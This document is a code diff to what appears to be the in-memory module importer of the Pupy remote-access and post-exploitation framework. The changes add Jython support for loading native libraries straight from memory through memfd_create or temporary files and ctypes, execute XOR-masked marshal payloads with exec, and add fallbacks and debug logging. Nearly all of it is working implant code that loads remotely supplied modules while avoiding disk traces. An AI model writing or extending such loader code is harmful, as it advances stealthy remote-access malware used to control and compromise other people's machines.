@@ -18,6 +18,9 @@
 #
 import sys, imp, marshal, gc
 
+if hasattr(sys.platform, 'addtarget'):
+    sys.platform.addtarget(None)
+
 __debug = False
 __trace = False
 __dprint_method = None
@@ -52,13 +55,7 @@ def loadpy(src, dst, masked=False):
         for i,x in enumerate(src):
             content[i] = chr(ord(x)^((2**((65535-i)%65535))%251))
 
-    try:
-        exec (marshal.loads(buffer(content)), dst)
-    except Exception, e:
-        dprint("loadpy failed: {}".format(e))
-        exec (marshal.loads(bytes(content)), dst)
-
-    del content
+    exec (marshal.loads(bytes(content)), dst)
 
 def find_writable_folder():
     dprint('Search writable folder')
@@ -115,9 +112,13 @@ def get_tmpfile_function():
     from tempfile import mkstemp
     import platform
 
+    is_java = False
+    if platform.system() == 'Java':
+        is_java = True
+
     if sys.platform.startswith('linux'):
         maj, min = platform.release().split('.')[:2]
-        if maj >= 3 and min >= 13:
+        if not is_java and maj >= 3 and min >= 13:
             __NR_memfd_create_syscall = {
                 'x86_64':   319,
                 '__i386__': 356,
@@ -155,7 +156,9 @@ def get_tmpfile_function():
         folder = find_writable_folder()
         if folder:
             def mkstemp_create(name=None):
-                return mkstemp(prefix=name, dir=folder)
+                return mkstemp(prefix=name or 'heap', dir=folder)
+
+            return mkstemp_create
 
 def py_memimporter():
     create_tmpfile = get_tmpfile_function()
@@ -164,6 +167,8 @@ def py_memimporter():
         return None
 
     from os import write, close, unlink
+    from os.path import basename
+    import platform
 
     class MemImporter(object):
         def __init__(self, create_tmpfile):
@@ -174,18 +179,55 @@ def py_memimporter():
                 data, fullname, dlopen=False,
                 initfuncname=initfuncname)
 
-        def _load_library(self, data, initfuncname):
+        def _load_library(self, fullname, data, initfuncname):
             fd, name = self._create_tmpfile()
+
+            dprint('pymemimporter: load_library: {}, {}, {}, {}; system: {}'.format(
+                fullname, len(data), initfuncname, name, platform.system()))
             try:
-                write(fd, data)
+                try:
+                    bs = write(fd, data)
+                except:
+                    bs = write(fd, bytearray(data))
 
                 result = None
-                if initfuncname:
-                    result = imp.load_dynamic(initfuncname[4:], name)
-                else:
-                    result = imp.load_dynamic(fullname, name)
+                if platform.system() == 'Java':
+                    import ctypes
 
+                    fullname = basename(fullname)
+                    dprint('pymemimporter: Java JyNI (hopefully) loader. Modulename: {}'.format(fullname))
+
+                    modulename = fullname.split('.')[-1]
+
+                    if not initfuncname:
+                        initfuncname = 'init' + modulename
+
+                    dprint('pymemimporter: Initializer: {}@{}'.format(initfuncname, name))
+                    lib = ctypes.CDLL(name)
+                    dprint('pymemimporter: Library loaded: {}'.format(lib))
+
+                    func = lib[initfuncname]
+                    dprint('pymemimporter: Function found: {}'.format(func))
+
+                    if func:
+                        ret = func()
+                        dprint('pymemimporter: Something happened: {:016x}'.format(ret))
+                        result = __import__(modulename)
+                    else:
+                        dprint('pymemimporter: init function "{}" not found in {}'.format(initfuncname, name))
+
+                else:
+                    dprint('pymemimporter: CPython loader. Modulename: {}'.format(fullname))
+                    if initfuncname:
+                        result = imp.load_dynamic(initfuncname[4:], name)
+                    else:
+                        result = imp.load_dynamic(fullname, name)
+
+                dprint('pymemimporter: Result: {}'.format(result))
                 return result
+
+            except Exception, e:
+                dprint('pymemimporter: {} / {} - load failed: {}'.format(fullname, name, e))
 
             finally:
                 close(fd)
@@ -199,9 +241,12 @@ def py_memimporter():
             if dlopen:
                 return ctypes.CDLL(fullname)
             else:
-                return self._load_library(data, initfuncname)
+                return self._load_library(fullname, data, initfuncname)
 
-    return MemImporter(create_tmpfile)
+    dprint('Creating memimporter...')
+    x = MemImporter(create_tmpfile)
+    dprint(x)
+    return x
 
 
 def memtrace(msg):
@@ -235,8 +280,16 @@ except ImportError:
     allow_system_packages = True
 
 if not builtin_memimporter:
-    _memimporter = py_memimporter()
-    builtin_memimporter = bool(_memimporter)
+    try:
+        dprint('Fallback to PyMemimporter')
+        _memimporter = py_memimporter()
+        dprint('Fallback to PyMemimporter.. complete: {}'.format(_memimporter))
+        builtin_memimporter = bool(_memimporter)
+    except Exception, e:
+        dprint('PyMemimporter implementation disabled: {}'.format(e))
+        builtin_memimporter = None
+
+dprint('PyMemimporter: {}'.format(builtin_memimporter))
 
 remote_load_package = None
 remote_print_error = None
@@ -484,6 +537,7 @@ class PupyPackageFinder(object):
             return None
 
         global remote_load_package
+        global builtin_memimporter
 
         dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))
 
@@ -502,6 +556,7 @@ class PupyPackageFinder(object):
 
             dprint('[L] find_module({},{}) in {})'.format(fullname, path, files))
             if not builtin_memimporter:
+                dprint('[L] find_module: filter out native libs')
                 files = [
                     f for f in files if not f.lower().endswith(('.pyd','.dll','.so'))
                 ]
